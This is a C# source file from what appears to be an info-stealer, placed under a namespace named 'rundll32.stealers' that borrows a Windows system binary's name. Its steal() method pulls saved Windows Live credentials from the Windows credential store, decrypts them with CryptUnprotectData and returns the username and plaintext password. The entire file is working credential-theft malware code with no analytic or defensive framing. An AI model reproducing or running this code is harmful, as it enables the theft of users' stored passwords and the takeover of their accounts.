using System;
using System.Runtime.InteropServices;

namespace rundll32.stealers;

internal class msn
{
	private struct CREDENTIAL
	{
		public int Flags;

		public int Type;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string TargetName;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string Comment;

		public long LastWritten;

		public int CredentialBlobSize;

		public int CredentialBlob;

		public int Persist;

		public int AttributeCount;

		public IntPtr Attributes;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string TargetAlias;

		[MarshalAs(UnmanagedType.LPWStr)]
		public string UserName;
	}

	private struct DATA_BLOB
	{
		public int cbData;

		public int pbData;
	}

	public struct acount
	{
		public string user;

		public string pass;
	}

	private static CREDENTIAL Cred;

	[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CredEnumerateW(string filter, uint flag, out uint count, out IntPtr pCredentials);

	[DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DATA_BLOB dataIn, int ppszDataDescr, int optionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

	public static acount steal()
	{
		acount result = default(acount);
		IntPtr pCredentials = IntPtr.Zero;
		if (CredEnumerateW("WindowsLive:name=*", 0u, out var _, out pCredentials))
		{
			IntPtr ptr = Marshal.ReadIntPtr(pCredentials, 0);
			Cred = (CREDENTIAL)Marshal.PtrToStructure(ptr, Cred.GetType());
			DATA_BLOB dataIn = default(DATA_BLOB);
			dataIn.pbData = Cred.CredentialBlob;
			dataIn.cbData = Cred.CredentialBlobSize;
			CryptUnprotectData(ref dataIn, 0, 0, 0, 0, 1, out var pDataOut);
			pDataOut.pbData = dataIn.pbData;
			result.user = Cred.UserName;
			result.pass = Marshal.PtrToStringUni(new IntPtr(pDataOut.pbData));
		}
		return result;
	}
}
